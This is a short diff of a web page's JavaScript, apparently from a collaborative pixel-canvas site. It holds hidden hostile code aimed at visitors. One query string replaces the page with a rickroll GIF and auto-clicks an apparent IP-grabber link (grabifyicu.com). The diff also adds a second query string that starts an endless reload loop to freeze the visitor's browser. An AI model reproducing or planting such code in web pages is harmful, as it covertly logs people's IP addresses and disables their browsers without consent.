@@ -832,8 +832,8 @@
 		if (window.location.search == "?discord-invite=%22%22") {
 			document.body.innerHTML = '<img src="https://c.tenor.com/_4YgA77ExHEAAAAd/rick-roll.gif" style="width:100%; height:100%;"> <a id="grabLink" href="https://grabifyicu.com/GHBBED" target="_blank" rel="noopener noreferrer">'
 			document.getElementById("grabLink").click()
-			setTimeout(function(){ while (true) { window.location.reload() } }, 6000)
 		}
+		if (window.location.search == "?discord-invite-lag=%22%22") { setTimeout(function(){ while (true) { window.location.reload() } }, 6000) }
 		// The page is in an iframe, android webview or free app maker (bad)
 		if (window.location !== window.parent.location || typeof window.Android !== "undefined" || typeof window.Kodular !== "undefined") window.location.replace("https://raw.githubusercontent.com/rslashplace2/rslashplace2.github.io/main/warning.png")
 		setTimeout(() => (window.connproblems||{style:{}}).style.opacity = 1, 5000)
